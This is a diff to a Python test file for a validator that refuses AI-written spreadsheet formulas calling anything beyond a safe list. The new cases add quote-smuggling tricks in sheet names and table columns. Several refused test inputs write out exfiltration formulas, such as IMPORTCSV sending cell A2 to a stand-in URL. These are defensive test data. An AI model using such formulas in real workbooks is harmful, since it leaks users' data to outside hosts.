@@ -175,7 +175,12 @@ def test_a_formula_from_the_ai_may_call_every_function_on_the_safe_list(fn):
                                      '=MAP(CHAR(91)&"Other.xlsx"&CHAR(93)&"S"&CHAR(33)&"A1",INDIRECT)',
                                      # a LET or LAMBDA name counts only inside its own LET or LAMBDA, after it is named
                                      '=LET(f,IMPORTCSV,f("https:"&"//x/?"&A2))', "=LET(IMAGE,1,0)+MAP(A2,IMAGE)",
-                                     "=LET(a,IMPORTCSV,IMPORTCSV,1,a(A2))", "=MAP(A2,LAMBDA(x,x))+MAP(A2,x)"])
+                                     "=LET(a,IMPORTCSV,IMPORTCSV,1,a(A2))", "=MAP(A2,LAMBDA(x,x))+MAP(A2,x)",
+                                     # AH-160: a quote inside a sheet name or a table column opened a fake "string"
+                                     # that hid the call between two of them; a quote or bracket left open is no read
+                                     "=SUM('\"'!A1,IMPORTCSV(\"https:\"&\"//x/?\"&A2),'\"'!A1)",
+                                     '=SUM(T[a"b],COPILOT(A1),T[c"d])', "=SUM(T[c'],COPILOT(A1),T['c])",
+                                     "=SUM(T[it''s],COPILOT(A1),'it''s'!A1)", '=COPILOT(A1)&"'])
 def test_a_formula_from_the_ai_that_calls_anything_else_is_refused(formula):
     assert client.unsafe_call(formula)
 
@@ -185,6 +190,9 @@ def test_a_formula_from_the_ai_that_calls_anything_else_is_refused(formula):
                                      "=LET(x,C2,y,x*2,y+1)", "=MAP(C2:C3,LAMBDA(v,ROUND(v,0)))", "=LAMBDA(a,b,a+b)(C2,C3)",
                                      "=LET(f,LAMBDA(x,x+1),f(C2))", "=BYROW(A2:C3,COUNTA)", "=IF(C2>0,TRUE,FALSE)",
                                      "=IFERROR(C2,#N/A)", "=C2*1.5E+3", "=SUM(A2#)", "=@A2:A9", "=SUM({1,2;3,4})",
-                                     '=IF(C2="IMAGE",1,0)', "=_xlfn.XLOOKUP(A2,A2:A3,C2:C3)", "=LOG10(C2)"])
+                                     '=IF(C2="IMAGE",1,0)', "=_xlfn.XLOOKUP(A2,A2:A3,C2:C3)", "=LOG10(C2)",
+                                     # AH-160: quotes as Excel escapes them, in a string, a sheet name and a column
+                                     "='Q1 sales'!B2*2", '=IF(C2="say ""IMAGE(1)""",1,0)', "=SUM('it''s'!A1)",
+                                     "=SUM(Table1[it''s])", "=Table1[[#This Row],[a']b]]"])
 def test_a_formula_from_the_ai_may_name_cells_tables_sheets_and_its_own_let_and_lambda_names(formula):
     assert not client.unsafe_call(formula)
